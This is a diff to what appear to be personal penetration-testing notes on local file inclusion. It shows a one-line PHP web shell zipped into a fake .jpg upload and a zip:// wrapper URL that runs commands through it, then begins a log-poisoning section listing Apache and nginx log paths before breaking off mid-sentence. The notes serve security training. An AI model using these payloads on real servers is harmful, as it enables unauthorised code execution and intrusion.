@@ -170,4 +170,15 @@ If the zip wrapper is enabled, we can use it to execute PHP code in zip format, 
 ```
 echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
 ```
-Notice that the file we upload would still be detected as a zip file, even though we zipped shell.php into shell.jpg, the rate of success would be higher if the website natively allows one to upload zip file
+Notice that the file we upload would still be detected as a zip file, even though we zipped shell.php into shell.jpg, the rate of success would be higher if the website natively allows one to upload zip file, below is example to access it:
+```
+http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+#Syntax
+http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/<zipname>%23<zipfile>&cmd=id
+```
+
+for attempting to use phar upload attack, refer to https://academy.hackthebox.com/app/module/23/section/1493
+
+Log Poisoning: 
+
+We can attempt to poison Server logs (located at `/var/log/apache2/`, `C:\xampp\apache\logs\` for apache or `/var/log/nginx/`, `C:\nginx\log\` for nginx), if the log is readable to us and we are able to control the content of the log in some manner, we can write 
